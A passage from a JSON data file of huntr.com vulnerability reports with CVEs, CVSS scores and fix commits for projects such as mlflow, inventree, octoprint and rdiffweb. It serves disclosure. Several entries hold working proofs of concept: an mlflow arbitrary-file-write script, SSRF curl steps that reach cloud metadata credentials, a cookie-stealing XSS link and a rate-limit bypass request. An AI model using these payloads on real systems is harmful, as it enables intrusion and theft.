hijacking, sensitive data exposure, and worse."}, "https://huntr.com/bounties/b114e82f-6c02-485b-82ea-e242f89169c2/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - DOM", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Critical (9)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/26bf51c20a1c9b3130ac5dd2e17649bece5ff84f", "description": "Description\nThe application inventree is vulnerable to Stored XSS in part IPN field.\nProof of Concept\nVideo PoC link: https://drive.google.com/file/d/1HE_y7XS89FlzVSPFGilowBrBDMPAfC_s/view?usp=sharing\nImpact\nThis allows the attacker to execute malicious scripts in all the project members browser and it can lead to session hijacking, sensitive data exposure, and worse."}, "https://huntr.com/bounties/0cd30d71-1e32-4a0b-b4c3-faaa1907b541/": {"cve": "CVE-2022-1430", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-1430", "cwe": "CWE-79: Cross-site Scripting (XSS) - DOM", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/octoprint/octoprint", "fix_commit": "https://www.github.com/octoprint/octoprint/commit/8087528e4a7ddd15c7d95ff662deb5ef7de90045", "description": "Description\nThe endpoint of login allows Javascript payload to execute which leads to XSS pop-up\nProof of Concept\nSend this link to admin http://127.0.0.1:2222/login/?redirect=javascript:alert(document.cookie)\nWhen he will open it and try to login XSS will popup.\nImage POC\nhttps://drive.google.com/file/d/1VoO0BHUE03o0iOo8B9WFRvC1zRrFN4-T/view?usp=sharing\nImpact\nAttacker able to capture admin cookie and can takeover his account."}, "https://huntr.com/bounties/9f746881-ad42-446b-9b1d-153391eacc09/": {"cve": "CVE-2022-4719", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-4719", "cwe": "CWE-840: Business Logic Errors", "cwe_link": "https://cwe.mitre.org/data/definitions/840.html", "severity_score": "Medium (5.7)\nAttack vector\nPhysical\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/bc4bed89affcba71251fe54ed10639da9d392c1d", "description": "Description\nAdding SSH key is a sensitive action . As the application triggers a notification on all sensitive actions like email change/password reset , SSH key is also an important security feature to be notified about\nProof of Concept\n1) Go to https://rdiffweb-dev.ikus-soft.com/prefs/sshkeys\n2) Do all necessary steps to successfully add a SSH key\n3) Check the inbox of your registered email\n4) You will notice that there is no notification triggered on this security endpoint \n\n\n\n\n\n# Impact\n\nIn case an attacker is able to add SSH key in any means , user will remain unaware of this change which raises a security concern"}, "https://huntr.com/bounties/b8a40ba6-2452-4abe-a80a-2d065ee8891e/": {"cve": "CVE-2022-3363", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3363", "cwe": "CWE-840: Business Logic Errors", "cwe_link": "https://cwe.mitre.org/data/definitions/840.html", "severity_score": "Low (2.8)\nAttack vector\nPhysical\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/c27c46bac656b1da74f28eac1b52dfa5df76e6f2", "description": "Description\n2FA enable/disable is a sensitive action . As the application triggers a notification on all sensitive actions like email change/password reset , 2FA is also an important security feature to be notified about\nProof of Concept\n1) Go to https://rdiffweb-dev.ikus-soft.com/prefs/mfa \n2) Do all necessary steps to successfully enable 2FA\n3) Check the inbox of your registered email\n4) You will notice that there is no notification triggered on this security endpoint \n\n# Impact\n\nIn case an attacker is able to disable 2FA in any means , user will remain unaware of this change "}, "https://huntr.com/bounties/0e89aebb-8382-42bf-a03a-3ea5170d2725/": {"cve": "", "cve_link": "", "cwe": "CWE-840: Business Logic Errors", "cwe_link": "https://cwe.mitre.org/data/definitions/840.html", "severity_score": "High (7.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/28258e5dd85e7c417918ed3bf481e19ed5eff91f", "description": "Description\nIn login API, by default, the IP address will be blocked when the user tries to login incorrectly more than 5 times but we can bypass this mechanism by abuse X-Forwarded-For header to bypass IP dectection and perform password brute-force.\nProof of Concept\nPOST /login/ HTTP/1.1\nHost: rdiffweb-demo.ikus-soft.com\nCookie: session_id=79c34d46cd0e592e066e1a7b128cffee4972d4f7\nContent-Length: 42\nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nOrigin: https://rdiffweb-demo.ikus-soft.com\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://rdiffweb-demo.ikus-soft.com/login/?redirect=%2F\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nX-Forwarded-For: 127.0.0.202 // Change IP\nConnection: close\n\nlogin=admin&password=admin123&redirect=%2F\nVideo POC\nhttps://drive.google.com/drive/folders/1q9u_1RZMAbCOwG0_ld_RupJEKF1WyM0b?usp=sharing\nImpact\nThis vulnerabiliy allow the attacker can perform bruteforce admin's password, perform deny of services attack, ..."}, "https://huntr.com/bounties/eb3b9123-6d95-42c7-9639-4ef2ebc66a63/": {"cve": "", "cve_link": "", "cwe": "CWE-840: Business Logic Errors", "cwe_link": "https://cwe.mitre.org/data/definitions/840.html", "severity_score": "High (7.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/95a72ae902cd5f16d502ae62233856cd37a94d19", "description": "Description\nWhen submit invalid form, the server will redirect to url which obtain via Referrer header.\nProof of Concept\nPOST /create-shelf HTTP/2\nHost: book.dansmonorage.blue\nCookie: csrftoken=ZpIuGbCcxOyhta5bki4N46N7vknEAcpaG3881kcMAfWKBEYKEiLEeSc3Sr4lUTVa; django_language=en-us; sessionid=eehh5ghe5q98xephiv46onn3jixdgx7p\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://google.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 159\nOrigin: https://fishing.attacker.com\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nTe: trailers\n\ncsrfmiddlewaretoken=aCHsAiZx3GMVTl4XkpU7hpChuv6mePSLRg76Vrz767ao1PXwEpBYrb1dRCN3ywoL&user[]=6858&name=IDORRRRRRRRRRRRRR&description=133123123123&privacy=public\nPoC Image\nImpact\nThis vulnerability is capable of redirect user to fishing, redirect to attack host,..."}, "https://huntr.com/bounties/8b9df094-8ee7-4aa9-8272-e6b85a14fe97/": {"cve": "", "cve_link": "", "cwe": "CWE-840: Business Logic Errors", "cwe_link": "https://cwe.mitre.org/data/definitions/840.html", "severity_score": "Medium (6.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/12fcccb5a63f3c15c521a61ce3b60a712a0deca7", "description": "Description\nRecently, i found a business logic vulnerabity and this vulnerability allow reader user perform privilege escalation on allaccess user. Because before user perform any function, client-side will perform OPTIONS request to view user permission with specify function via response body. If the attacker can manipulate response body, the attacker can modify this response body and access sensitive function.\nStep to reproduce\n1 - User reader can not perform Add Link function.\n2 - In Burp suite, Proxy > Options > Match and replace , click Add.\nReplace \"actions\":{\"GET\":true} with \"actions\":{\"POST\":{\"pk\":{\"type\":\"integer\",\"required\":true,\"read_only\":true,\"label\":\"ID\"},\"build\":{\"type\":\"related field\",\"required\":true,\"read_only\":false,\"label\":\"Build\",\"model\":\"build\",\"api_url\":\"/api/build/\",\"filters\":{},\"help_text\":\"\"},\"attachment\":{\"type\":\"file upload\",\"required\":true,\"read_only\":false,\"label\":\"Attachment\",\"help_text\":\"Select file to attach\"},\"link\":{\"type\":\"url\",\"required\":false,\"read_only\":false,\"label\":\"Link\",\"help_text\":\"Link to external URL\",\"max_length\":200},\"filename\":{\"type\":\"string\",\"required\":true,\"read_only\":false,\"label\":\"Filename\"},\"comment\":{\"type\":\"string\",\"required\":false,\"read_only\":false,\"label\":\"Comment\",\"help_text\":\"File comment\",\"max_length\":100},\"upload_date\":{\"type\":\"date\",\"required\":true,\"read_only\":true,\"label\":\"Upload date\",\"help_text\":\"\"},\"user\":{\"type\":\"related field\",\"required\":false,\"read_only\":false,\"label\":\"User\",\"help_text\":\"User\",\"model\":\"user\",\"api_url\":\"/api/user/\",\"filters\":{}},\"user_detail\":{\"type\":\"nested object\",\"required\":true,\"read_only\":true,\"label\":\"User detail\",\"children\":{\"pk\":{\"type\":\"integer\",\"required\":true,\"read_only\":true,\"label\":\"ID\"},\"username\":{\"type\":\"string\",\"required\":true,\"read_only\":false,\"label\":\"Username\",\"help_text\":\"Required. 150 characters or fewer. Letters, digits and @/./+/-/_ only.\",\"max_length\":150},\"first_name\":{\"type\":\"string\",\"required\":false,\"read_only\":false,\"label\":\"First name\",\"max_length\":150,\"help_text\":\"\"},\"last_name\":{\"type\":\"string\",\"required\":false,\"read_only\":false,\"label\":\"Last name\",\"max_length\":150,\"help_text\":\"\"},\"email\":{\"type\":\"email\",\"required\":false,\"read_only\":false,\"label\":\"Email address\",\"max_length\":254,\"help_text\":\"\"}}}},\"DELETE\":true,\"GET\":true}\nAnd click OK.\n3 - Try Add link funcion again with reader account, and success!\nImpact\nThis vulnerability allow attacker with low privilege can perform high privilege to access sensitive function."}, "https://huntr.com/bounties/2408a52b-f05b-4cac-9765-4f74bac3f20f/": {"cve": "CVE-2023-6976", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6976", "cwe": "CWE-434: Unrestricted Upload of File with Dangerous Type", "cwe_link": "https://cwe.mitre.org/data/definitions/434.html", "severity_score": "High (8.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/5044878da0c1851ccfdd5c0a867157ed9a502fbc", "description": "The bug is in validate_path_is_safe() function, and the way it is used in handlers.\nMost serious of the vulnerabilities is in upload_artifact_handler() function (server/handlers.py), but there are other handlers that make the same mistake and allow for LFI.\nIn upload_artifact_handler(), path is controlled by an attacker through query paramter path. validate_path_is_safe(path) is used to verify it, where it will check if is_file_uri(path) and if so it will extract path component in local_file_uri_to_path(path) with urllib.parse.urlparse(), but if there is # in the path, eg:\n>>> urllib.parse.urlparse('file://a#/../../../../../tmp/xxx')\n>>> ParseResult(scheme='file', netloc='a', path='', params='', query='', fragment='/../../../../../tmp/xxx')\nthen local_file_uri_to_path(path) will return an empty string and all checks in validate_path_is_safe() will pass, but back in upload_artifact_handler() it will continue to use the original value that was set as param. It will then extract\nbasename = posixpath.basename(path)\ndirname = posixpath.dirname(path)  \nso if path was file://a#/../../../../../tmp/xxx, then\nbasename == \"xxx\"\ndirname == \"file://a#/../../../../..//tmp\"\nlater it uses basename and dirname to create a file in temporary directory:\n    with tempfile.TemporaryDirectory() as tmpdir:\n        dir_path = os.path.join(tmpdir, dirname) if dirname else tmpdir\n        file_path = os.path.join(dir_path, basename)\n\n        os.makedirs(dir_path, exist_ok=True)\n\n        with open(file_path, \"wb\") as f:\n            f.write(data)\nso file_path will end up being /tmp/tmpRANDOM/file://a#/../../../../..//tmp/xxx, where it will effectively write to /tmp/xxx.\nimport sys\nfrom random import randbytes\nfrom requests import Session\n\nif __name__ == \"__main__\":\n    if len(sys.argv) < 4:\n        print(f\"python3 {sys.argv[0]} URL RPATH CONTENT\")\n        print(f\"example: python3 {sys.argv[0]} 'http://localhost:5000' '/tmp/pwnd' 'pwnd'\")\n        exit()\n\n    url, rpath, content = sys.argv[1:4]\n    ajax_api = f\"{url}/ajax-api/2.0/mlflow\"\n\n    experiment_name = \"e_\" + randbytes(4).hex()\n    with Session() as s:\n        # also possible to just supply existing run_uuid, but for the sake of automated\n        # PoC, new experiment and run will be created:\n        rsp = s.post(f\"{ajax_api}/experiments/create\", json={\n            \"name\" : experiment_name\n        })\n\n        experiment_id = rsp.json()[\"experiment_id\"]\n\n        rsp = s.post(f\"{ajax_api}/runs/create-promptlab-run\", json={\n            \"experiment_id\"     : experiment_id,\n            \"prompt_template\"   : \"xxx\",\n            \"prompt_parameters\" : [{\"key\":\"test\",\"value\":\"test\"}],\n            \"model_route\"       : \"/xxx\",\n            \"model_input\"       : \"[]\",\n            \"mlflow_version\"    : \"2.8.1\"\n        })\n\n        run_uuid = rsp.json()[\"run\"][\"info\"][\"run_uuid\"]\n        print(run_uuid)\n        rsp = s.post(f\"{ajax_api}/upload-artifact?run_uuid={run_uuid}&path=file://a%23/../../../../../{rpath}\", data=content)\n\n        rsp = s.post(f\"{ajax_api}/experiments/delete\", json={\n            \"experiment_id\" : experiment_id\n        })\nImpact\nThis vulnerability is capable of writing arbitrary files into arbitrary locations on the remote filesystem in the context of the server process."}, "https://huntr.com/bounties/c30d3503-600d-4d00-9571-98826a51f12c/": {"cve": "", "cve_link": "", "cwe": "CWE-434: Unrestricted Upload of File with Dangerous Type", "cwe_link": "https://cwe.mitre.org/data/definitions/434.html", "severity_score": "Low (3)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/kiwitcms/kiwi", "fix_commit": "https://www.github.com/kiwitcms/kiwi/commit/551dff9e719f0256e198b25df2ea43f1cc5cf1e5", "description": "Description\nIn upload function i found the function accept a lot of file type and this is very dangerous because may be malicious user upload html file contain any information like go to another site or write message destroying the company's reputation like this site has been hacked by hacker\nProof of Concept\n// PoC.js\nhttps://1drv.ms/v/s!AjTDEH9wRz1ugRBX4iqo_Hl0_-C0?e=MEVvSv\nImpact\nUpload html file contain message of any user and the real risk the file could be accessed by any unauthenticated user and will see the file normally as normal page in site"}, "https://huntr.com/bounties/b966c74d-6f3f-49fe-b40a-eaf25e362c56/": {"cve": "CVE-2022-2872", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-2872", "cwe": "CWE-434: Unrestricted Upload of File with Dangerous Type", "cwe_link": "https://cwe.mitre.org/data/definitions/434.html", "severity_score": "Low (3.7)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/octoprint/octoprint", "fix_commit": "https://www.github.com/octoprint/octoprint/commit/3e3c11811e216fb371a33e28412df83f9701e5b0", "description": "Description\nHello Team,\nHope you are doing good.\nDue to misconfiguration in move file functionality an attacker could easily change the file extension of the uploaded malicious file disguised as .gcode file.\nSteps:\n1 . Upload a .gcode file & intercept the request as shown in the screenshots.\n2 . Add malicious payload in the file content & keep file extension as .gcode.\n3 . Now select the file & click on move button.\n4 . Change the file extension to the html as shown in the screenshot & send the request.\n5 . Copy the file download link & share it with the victim user. Once the file is opened payload will be executed.\nImage POC\nhttps://drive.google.com/drive/folders/1cbbJKiOqZdgIbGM3Bx09Xq6Xjkkje948?usp=sharing\nImpact\nUsing this technique an attacker could trick a victim user in downloading a malicious file such as virus, html file containing cross site scripting payloads, etc."}, "https://huntr.com/bounties/a0e5c68e-0f75-499b-bd7b-d935fb8c0cd1/": {"cve": "CVE-2022-2111", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-2111", "cwe": "CWE-434: Unrestricted Upload of File with Dangerous Type", "cwe_link": "https://cwe.mitre.org/data/definitions/434.html", "severity_score": "Critical (9)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/26bf51c20a1c9b3130ac5dd2e17649bece5ff84f", "description": "Description\nThe application inventree allows users to upload any file in part attachment allowing attacker to render files such as HTML in the browser.\nProof of Concept\nVideo PoC Link: https://drive.google.com/file/d/1vurBkHegeYCwbXopE5Yhyb702rYgG9FM/view?usp=sharing\nImpact\nAuthenticated user can upload dangerous file to anywhere in server (example: upload a file with .html extension lead to stored xss)"}, "https://huntr.com/bounties/438b0524-da0e-4d08-976a-6f270c688393/": {"cve": "CVE-2023-6974", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6974", "cwe": "CWE-918: Server-Side Request Forgery (SSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/918.html", "severity_score": "High (8.6)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/8174250f83352a04c2d42079f414759060458555", "description": "As the framework is quite complex, I'm going to take the default configuration as reference for the whole report\n\ud83d\udd12\ufe0f Requirements\nNone: by default no authentication is required.\n  \ud83d\udcdd Description\nWhen creating a model version, it is possible use various protocols: (permalink)\n['', 'file', 's3', 'gs', 'wasbs', 'ftp', 'sftp', 'dbfs', 'hdfs', 'viewfs', 'runs', 'models', 'http', 'https', 'mlflow-artifacts']\nLike described in my previous (report), by creating 2 models, 1 with models wrapper and another with http wrapper, it is possible to trigger HTTP query and achieve a full controlled file write. (this situation is also possible using runs:/ wrapper, see Proof of Concept section)\n  In order to retrieve data from an http artifact, MLFlow use the HttpArtifactRepository class. When requesting http://127.0.0.1:5000/model-versions/get-artifact?path=poc.txt&name=poc&version=3 on such model, it will:\n1. List all artifacts using list_artifacts method (this is not really important for this issue). (permalink)\n2. Use the _download_file method to download the file (this is where the file write was occurring): (permalink)\ndef _download_file(self, remote_file_path, local_path):\n    endpoint = posixpath.join(\"/\", remote_file_path)\n    resp = http_request(self._host_creds, endpoint, \"GET\", stream=True)\n    augmented_raise_for_status(resp)\n    with open(local_path, \"wb\") as f:\n        chunk_size = 1024 * 1024  # 1 MB\n        for chunk in resp.iter_content(chunk_size=chunk_size):\n            f.write(chunk)\n3. Return the request content to the client: (permalink)\ndef _send_artifact(artifact_repository, path):\n    file_path = os.path.abspath(artifact_repository.download_artifacts(path))\n    mime_type = _guess_mime_type(file_path)\n    file_sender_response = send_file(file_path, mimetype=mime_type, as_attachment=True)\n    return _response_with_file_attachment_headers(file_path, file_sender_response)\nThe problem in the above flow, is that the http_request use requests library which follows HTTP redirects by default (permalink > permalink). Thus, by redirecting the download artifact request to an internal IP, it is possible to query and get the response from internal servers (SSRF).\n  \ud83d\udca5 Proof of Concept\nThe rogue HTTP server used's in the following PoC is:\nfrom flask import Flask, jsonify, redirect\n\napp = Flask(__name__)\napp.config[\"DEBUG\"] = True\n\n@app.errorhandler(404)\ndef page_not_found(e):\n    return redirect(\"http://localhost/\", 302)\n\n@app.route(\"/mlflow-artifacts/artifacts\")\ndef index():\n    return jsonify({})\n\napp.run(\"0.0.0.0\", 4444)\nIn order to prove the SSRF, I've setup locally an apache HTTP server which returns <h1>SECRET</h1>.\nSSRF\nStart the rogue web server:\npython run.py\nStart the mlflow web server:\nmlflow ui --host 127.0.0.1:5000\nCreate an experiment:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc3\", \"artifact_location\": \"http://localhost:4444/mlflow-artifacts/artifacts\"}' 'http://127\n.0.0.1:5000/ajax-api/2.0/mlflow/experiments/create'\nAssociate a run to it:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"experiment_id\": \"980171962784540106\"}' 'http://127.0.0.1:5000/api/2.0/mlflow/runs/create'\nCreate a model:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/registered-models/create'\nCreate a model version: (use runs:/ to link it to the previously created run)\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"source\": \"runs:/b0895f2dd7cc4e56aa132acd2b47fe41/a\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'\nTrigger the download:\ncurl 'http://127.0.0.1:5000/model-versions/get-artifact?path=whatever&name=poc&version=1'\nYou should get:\nRemote Code Execution\nI saw that there are several AWS tutorials to set up a MLFlow on an EC2 instance (for example). In this specific context, it is possible to take part of the EC2 instance API to get access to the IAM. To do so, you need to access:\nhttp://169.254.169.254/latest/meta-data/iam/...\nIf you need me to provide more endpoint, do not hesitate ;)\nDue to this, it is possible compromise the whole AWS organisation.\n  Models Impact\nModel impact of this issue depends on the internal server context, it could be either:\n- No models impact\n- Full models impact\n  \ud83d\udee0\ufe0f Fix suggestion\nStop following redirect when fetching HTTP artifacts content (allow_redirects = False). (permalink)\nImpact\nA malicious user could use this issue to access internal HTTP(s) servers and in the worst case (ie: aws instance) it could be abuse to get a remote code execution on the victim machine."}, "https://huntr.com/bounties/318dc043-2f39-4142-b288-8d97513cb51e/": {"cve": "", "cve_link": "", "cwe": "CWE-918: Server-Side Request Forgery (SSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/918.html", "severity_score": "High (8.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/hay-kot/mealie", "fix_commit": "https://www.github.com/hay-kot/mealie/commit/13850cda1f9cb02a8c788030ba6cfa96bba33571", "description": "Description\nIn the recipe edit page, is possible to upload an image directly or via an URL provided by the user. The function that handles the fetching and saving of the image via the URL doesn't have any URL verification, which allows to fetch internal services.\n\nFurthermore, after the resource is fetch, there is no MIME type validation, which would ensure that the resource is indeed an image. After this, because there is no extension in the provided URL, the application will fallback to jpg, and original for the image name.\n\nThen the result is saved to disk with the original.jpg name, that can be retrieved from the following URL: http://<domain>/api/media/recipes/<recipe-uid>/images/original.jpg. This file will contain the full response of the provided URL.\nProof of Concept\nFor testing purposes, I started an internal-only HTTP server, listening at port 8000, along side the application.\n\n1 - Login and edit an existing recipe.\n2 - Click in the Image button and insert an URL, in this case will be the target HTTP server: http://127.0.0.1:8000/\n3 - Visit the http://localhost:9091/api/media/recipes/<recipe-uid>/images/original.jpg URL and get the internal HTTP server response.\nImpact\nAn attacker can get sensitive information of any internal-only services running. For example, if the application is hosted on Amazon Web Services (AWS) plataform, its possible to fetch the AWS API endpoint, https://169.254.169.254, which returns API keys and other sensitive metadata."}, "https://huntr.com/bounties/901ea690-50dd-4bf0-b3a8-55b6c12a029b/": {"cve": "", "cve_link": "", "cwe": "CWE-918: Server-Side Request Forgery (SSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/918.html", "severity_score": "Critical (9.9)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/hay-kot/mealie", "fix_commit": "https://www.github.com/hay-kot/mealie/commit/13850cda1f9cb02a8c788030ba6cfa96bba33571", "description": "Description\nIn this case if a attacker try to load a huge file then server will try to load the file and eventually server use its all memory which will dos the server\nProof of Concept\n1.Goto https://demo.mealie.io/recipe/create/url?recipe_import_url=https%3A%2F%2Fspeed.hetzner.de%2F10GB.bin&import_keywords_as_tags=1\n2.Send this request 4-5 times.\n3.It will try to load file and dos the server.\n#POC :-\nhttps://youtu.be/qXAH_8SypTA\nImpact\nDeniel of service"}, "https://huntr.com/bounties/352b39da-0f2e-415a-9793-5480cae8bd27/": {"cve": "CVE-2022-1592", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-1592", "cwe": "CWE-918: Server-Side Request Forgery (SSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/918.html", "severity_score": "Critical (9.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/clinical-genomics/scout", "fix_commit": "https://www.github.com/clinical-genomics/scout/commit/b0ef15f4737d0c801154c1991b52ff5cab4f5c83", "description": "Description\nServer-Side Request Forgery in remote_cors\nProof of Concept\nGET /remote/cors/http://<my-vps>:8888 HTTP/1.1\nHost: localhost:8000\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nReferer: http://localhost:8000/cust000/cases\nCookie: <cookies>\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPoC Image\nImpact\nAn attacker could make the application perform arbitrary requests to fishing steal cookie, request to private area, or lead to xss..."}, "https://huntr.com/bounties/93e470d7-b6f0-409b-af63-49d3e2a26dbc/": {"cve": "CVE-2024-0520", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2024-0520", "cwe": "CWE-23: Relative Path Traversal", "cwe_link": "https://cwe.mitre.org/data/definitions/23.html", "severity_score": "Critical (10)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/400c226953b4568f4361bc0a0c223511652c2b9d", "description": "\ud83d\udd12\ufe0f Requirements\nThe user must load a dataset that he found on the internet.\n  \ud83d\udcdd Description\nAs described in the MLFlow documentation, the mlflow.data module can be used to:\n    In this context, in case the dataset source URL has an HTTP scheme, it will be load using the HTTPDatasetSource class: (permalink)\ndef load(self, dst_path=None) -> str:\n    resp = cloud_storage_http_request(\n        method=\"GET\",\n        url=self.url,\n        stream=True,\n    )\n    augmented_raise_for_status(resp)\n\n    path = urlparse(self.url).path\n    content_disposition = resp.headers.get(\"Content-Disposition\")\n    # CHECK HERE\n    if content_disposition is not None and (\n        file_name := next(re.finditer(r\"filename=(.+)\",\n        content_disposition), None)\n    ):\n        basename = file_name[1].strip(\"'\\\"\") # NO SANITIZING HERE\n    elif path is not None and len(posixpath.basename(path)) > 0:\n        basename = posixpath.basename(path)\n    else:\n        basename = \"dataset_source\"\n    \n    if dst_path is None:\n        dst_path = create_tmp_dir()\n\n    dst_path = os.path.join(dst_path, basename)\n    with open(dst_path, \"wb\") as f:\n        # ...\nAs you can see in the above snippet, in case the Content-Disposition header is set in the response, it will use the filename part to generate the final file path without sanitization.\nBecause it is used inside a os.path.join, the file name could be fully controlled using:\n  - Path traversal ../../tmp/poc.txt.\n- Absolute path /tmp/poc.txt.\n  \ud83d\udca5 Proof of Concept\nFull Controlled File Write\n1. Run the following rogue HTTP server:\nfrom flask import Flask, Response\napp = 